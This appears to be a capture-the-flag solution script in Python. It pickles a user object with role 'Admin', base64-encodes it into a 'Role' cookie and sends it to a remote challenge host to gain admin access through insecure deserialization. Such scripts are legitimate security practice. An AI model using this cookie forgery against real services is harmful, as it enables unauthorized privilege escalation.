import requests
import base64
import pickle
from flask import Flask, request, make_response, render_template

app = Flask(__name__)

class UserType(object):
    def __init__(self):
        self.role =''
        self.name =''


@app.route('/', methods=['GET', 'POST'])
def index():
    user = UserType()
    user.name = 'WTF'
    user.role = 'Admin'
    pickle_data = pickle.dumps(user)
    cookie_data = base64.b64encode(pickle_data)
    s = requests.Session()
    print(cookie_data)
    s.cookies.set("Role", str(cookie_data.decode('utf-8')))
    resp = s.get('https://greensalt.io.ept.gg/mainpage')
    #resp = s.get('http://127.0.0.1:5000/getcookie')
    return resp.content

